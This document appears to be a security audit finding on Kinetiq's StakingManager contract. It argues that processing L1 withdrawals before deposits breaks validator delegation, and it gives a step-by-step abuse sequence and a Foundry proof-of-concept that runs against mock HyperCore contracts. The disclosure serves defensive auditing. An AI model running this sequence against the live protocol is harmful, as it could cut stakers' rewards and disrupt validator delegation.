# In `StakingManager.sol` L1 queue operations, executing Withdrawal queue before Deposit queue will revert because of token delegation

## Summary 
The operator running `StakingManager.processL1Operations()` on Layer 1 HyperCore will likely encounter a revert. This occurs because the function attempts to undelegate all tokens in the withdrawal queue before delegating tokens from new deposits.

As a result, not all deposit staking balances are correctly delegated to the validator.

Since L1 calls *do not revert* on the L2 EVM, this exploit can be used to force the undelegation of L1 validator staking. However, this requires significant resources and time.

## Finding description

`StakingManager` has batch operations on L1. These operations are delayed and handle all withdrawals first before processing all deposits in the queue.

The underlying issue is that L1 Hyperliquid Core might depend on funds from the deposit queue before it can process withdrawals.

Example of the issue flow:

1. L1 HyperCore `StakingManager` address has 100 HYPE in its staking balance, with 100 HYPE delegated to a validator.
2. A user deposits 200 HYPE on L2 EVM by calling `StakingManager.stake(){value: 200e18}`. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L219-L252)
   - The user receives 200 kHYPE on L2 EVM.
   - A pending L1 deposit operation is created. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L483-L484)
   - L1 HyperCore `StakingManager` receives 200 HYPE into its staking balance. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L481)
   - L1 HyperCore `StakingManager` now has 300 HYPE in its staking balance, with 100 HYPE delegated.
3. The user withdraws 200 kHYPE immediately by calling `StakingManager.queueWithdrawal(100e18)` twice. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L256-L296)
   - 200 kHYPE is taken from the user and sent to `StakingManager`.
   - Assuming no buffer, two pending L1 withdrawal operations are created. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L544-L545)

4. The operator processes all pending L2 operations by calling `StakingManager.processL1Operations(0)`. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L627-L666)
   - Batch operations always handle the withdrawal array first. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L642)
   - Two pending withdrawals of 100 HYPE each are processed. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L673-L714)
     - **First withdrawal**: Undelegates 100 HYPE from the validator. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L693)
       - L1 HyperCore validator now has 0 HYPE delegated.
       - L1 HyperCore withdraws 100 HYPE from staking and sends it to the `StakingManager` address on L2.
     - **Second withdrawal**: Attempts to undelegate another 100 HYPE from the validator.
       - L1 HyperCore **reverts** because the validator has no delegation left.
       - L1 HyperCore withdraws 100 HYPE from staking and sends it to the `StakingManager` address on L2.
   - **Deposit queue**: Sends a token delegation command to L1 with 200 HYPE.
     - L1 HyperCore has 100 HYPE in its staking balance.
     - Attempting to delegate 200 HYPE to the validator also **reverts**.

5. L1 HyperCore `StakingManager` address now has 200 HYPE in its spot balance, 100 HYPE in its staking balance, and no delegation.
6. After 7 days, the user calls `confirmWithdrawal`. [Ref](https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L314-L331)
   - 200 kHYPE is burned.
   - The user receives back 200 HYPE minus fees.

The normal state for Staking Manager on L1 would be all staking balance is delegated to validator after all pending operation. As seen in `5.`, this is not true.

Because HyperEVM documentation is unclear on how interactions with HyperCore work, it is uncertain whether transactions will revert when emitting events, and whether HyperCore L1 transaction builders will accept out-of-order operations.

This report assumes L1 runs on a first-in-first-out operation. `StakingManager` becomes **bricked**.

## Impact

- Not all staking balances are delegated to the validator, requiring operator intervention to manually fix the issue.
- Reduced rewards to users.
- Mismatch balance will prevent unstake from Staking Balance for 7 days period from happening.
- Mismatch balance require admin intervention manually call rebalance.

To execute above exploit attack, an attacker would need more HYPE balance than the total L1 staking balance of single validator and 7 days to repeat attack. Which is unlikely after protocol run for a while.

- Based on [Docs](https://hyperliquid.gitbook.io/hyperliquid-docs/hypercore/staking), forcing a validator to undelegate its staking power has unclear ramifications:
  - Reduced rewards for staking temporarily.
  - Potential reduction in the total voting power of the mainstream quorum(2/3 votes). However, it is unlikely that the L2 EVM has enough tokens to allow a hostile takeover of the validator network.

The impact is high due to the potential loss of rewards, and be abused by any user.

## POC

The report includes a proof of concept (POC) with a mocked contract for L1 HyperCore. Based on [official docs](https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/hyperevm/interacting-with-hypercore) and [EVM explorer](https://hyperscan.gas.zip/address/0x3333333333333333333333333333333333333333?tab=txs), it is unclear how the bridge layer between HyperCore L1 and HyperEVM L2 works.

This coded POC assumes there is a simple message layer and that it does not throw a revert on L2 EVM if L1 reaches an error state and reverts.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Base.t.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {console2 as console} from "forge-std/console2.sol";

contract DebugTest is BaseTest {
    // address user = makeAddr("user");
    MockL1_HYPE_CONTRACT mockL1Core = MockL1_HYPE_CONTRACT(payable(0x2222222222222222222222222222222222222222));
    MockL1_WRITE_CONTRACT writeContract = MockL1_WRITE_CONTRACT(0x3333333333333333333333333333333333333333);

    address validator = makeAddr("validator");

    function setUp() public override {
        super.setUp();
        // Override L1Write with MockL1Write. To simulate L1 balance and calls
        // not using actual fork for HyperLiquid L1,L2 EVM
        vm.etch(address(0x2222222222222222222222222222222222222222), address(new MockL1_HYPE_CONTRACT()).code);
        vm.etch(address(0x3333333333333333333333333333333333333333), address(new MockL1_WRITE_CONTRACT()).code);

        //update manager config
        vm.startPrank(manager);
        stakingManager.setMaxStakeAmount(1000 ether);
        stakingManager.setStakingLimit(0);
        validatorManager.activateValidator(validator);
        validatorManager.setDelegation(address(stakingManager), validator);

        assertEq(mockL1Core.decimals(), 8); // L1 HYPE have 8 decimals
        vm.stopPrank();
    }

    function test_debug() public {
        // User start with 1000 HYPE on L2 EVM
        deal(user, 1000 ether);
        // stake 100 HYPE, get 100 kHYPE. L1 get 100 HYPE to staking account.
        vm.startPrank(user);
        stakingManager.stake{value: 100 ether}();
        stakingManager.stake{value: 100 ether}();
        stakingManager.stake{value: 100 ether}();

        kHYPE.approve(address(stakingManager),type(uint).max);
        stakingManager.queueWithdrawal(300 ether);

        console.log("kHYPE balance: %e", kHYPE.balanceOf(user));

        _logging();
        // no delegate power yet. it is still in pending state.

        _processAllL1Operations();

        _logging();
    }

    function _logging() internal {
        console.log("totalStake: %e", stakingAccountant.totalStaked());
        console.log("totalClaimed: %e", stakingAccountant.totalClaimed());

        console.log("StakingManager L1 Hype: %e", mockL1Core.balanceOf(address(stakingManager)));
        console.log("StakingManager L1 staked: %e", mockL1Core.stakingBalance(address(stakingManager)));
        console.log("validator L1 delegating power: %e", mockL1Core.stakingBalance(address(validator)));
    }

    function _processAllL1Operations() internal {        
        vm.startPrank(operator);
        console.log("--execute all pending operations--");
        stakingManager.processL1Operations(0); // process all L1 operations
        vm.stopPrank();
    }
}

contract MockL1_HYPE_CONTRACT is ERC20("Mock L1 HYPE", "L1 HYPE") {
    // etched on 0x2222222222222222222222222222222222222222
    mapping(address => uint256) public stakingBalance; //L1 staking balance
    uint256 public totalStaked; //L1 staking balance

    receive() external payable {
        //https://app.hyperliquid.xyz/explorer/token/0x0d01dc56dcaaca66ad901c959b4011ec
        _mint(msg.sender, msg.value / 1e10); //L1 have 8 decimals for HYPE
    }

    function decimals() public view override returns (uint8) {
        return 8;
    }

    //type: cDeposit
    function stake(address user, uint256 amount) public {
        _burn(user, amount); //L1 burn HYPE to simulate deposit to staking account
        stakingBalance[user] += amount;
        totalStaked += amount;
    }

    //type: cWithdraw
    function unstake(address user, uint256 amount) public {
        stakingBalance[user] -= amount;
        totalStaked -= amount;
        _mint(user, amount); //L1 mint HYPE to simulate withdraw from staking account
    }

    // type: tokenDelegate
    function delegate(address user, address validator, uint256 amount, bool isUndelegate) public {
        //to simulate delegation. the best way simply transfer staking power to target address. Not correct way, but good enough for mock
        if (isUndelegate) {
            require(stakingBalance[validator] >= amount, "Validator not enough staking balance to undelegate");
            stakingBalance[user] += amount;
            stakingBalance[validator] -= amount;
        } else {
            // delegate to validator
            require(stakingBalance[user] >= amount, "user not enough staking balance to delegate");
            stakingBalance[user] -= amount;
            stakingBalance[validator] += amount;
        }
    }

    function _update(address from, address to, uint256 value) internal override {
        //@dev ignore staking balance from being transferred. This is just a mock. no use case for something already check on L1 mainnet
        super._update(from, to, value);
    }
}

contract MockL1_WRITE_CONTRACT {
    // etched on 0x3333333333333333333333333333333333333333
    MockL1_HYPE_CONTRACT public immutable mockL1Core =
        MockL1_HYPE_CONTRACT(payable(0x2222222222222222222222222222222222222222));

    event TokenDelegate(address indexed user, address indexed validator, uint64 _wei, bool isUndelegate);
    event CDeposit(address indexed user, uint64 _wei);
    event CWithdrawal(address indexed user, uint64 _wei);
    event SpotSend(address indexed user, address indexed destination, uint64 token, uint64 _wei);

    function sendTokenDelegate(address validator, uint64 _wei, bool isUndelegate) external {
        emit TokenDelegate(msg.sender, validator, _wei, isUndelegate); //@Delegate or undelegate stake from validator
        //@dev ignore possible not enough token to delegate on L1. This is just a mock. Out of balance is a bug that will be reported through testing.
        mockL1Core.delegate(msg.sender, validator, _wei, isUndelegate); //@L1 move HYPE balance to staking balance
    }

    function sendCDeposit(uint64 _wei) external {
        emit CDeposit(msg.sender, _wei); //@deposit into staking
        mockL1Core.stake(msg.sender, _wei); //@L1 move HYPE balance to staking balance
            // console.log("sendCDeposit: ", msg.sender,_wei);
    }

    function sendCWithdrawal(uint64 _wei) external {
        emit CWithdrawal(msg.sender, _wei); //@Withdraw from staking
        mockL1Core.unstake(msg.sender, _wei); //@L1 unstake and get HYPE back to user
    }

    function sendSpot(address destination, uint64 token, uint64 _wei) external {
        emit SpotSend(msg.sender, destination, token, _wei); //Core spot transfer , L1 asset token, to L1 address,
    }
}

```

## Recommended mitigation steps

Process all operations in order of queue. Manager/Operator can skip queue can execute to `L1Write` directly.

Alternatively, include more validation with `L1Read.sol` before calling `L1Write`.
